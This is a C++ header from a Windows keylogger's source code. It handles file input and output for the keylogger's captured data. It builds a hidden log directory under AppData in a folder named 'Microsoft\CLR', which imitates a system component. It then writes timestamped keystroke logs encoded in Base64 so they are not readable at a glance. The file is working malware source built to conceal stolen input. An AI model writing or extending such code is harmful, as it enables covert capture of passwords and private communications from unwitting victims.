// Functions here deals with Input/Output operations for files (Creating Directories and Keylog File)

#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <Windows.h>
#include <fstream>
#include "Base64.h"
#include "Helper.h"

namespace IO
{
	std::string GetOurPath(const bool append_seperator = false) {

		std::string appDataDir(getenv("AppData"));
		std::string full = appDataDir + "\\Microsoft\\CLR";
		return full + (append_seperator ? "\\" : "");

	}
	bool makeOneDirectory(std::string path)
	{
		return (bool)CreateDirectory(path.c_str(), NULL) ||
		GetLastError() == ERROR_ALREADY_EXISTS;
	}
	bool makeDirectory(std::string path)
	{
		for (char &c : path)
		{
			if (c == '\\')
			{
				c = '\0';
				if (!makeOneDirectory(path))
				{
					return false;
				}
				c = '\\';

			}
		}
		return true;

	}
	template <class T>
	std::string writeLog(const T &t)
	{
		std::string path = GetOurPath(true);
		Helper::DateTime dt;
		std::string name = dt.GetDateTimeString("_") + ".log";

		try {
			std::ofstream file(path + name);
			if (!file) return "";
			std::ostringstream oss;
			oss << "[" << dt.GetDateTimeString() << "]" <<
				std::endl << t << std::endl;
			std::string data = Base64::Encrypt64(oss.str());
			file << data;
			if (!file) return "";
			file.close();
			return name;
		}
		catch (...)
		{
			return "";
		}
	}

}


#endif

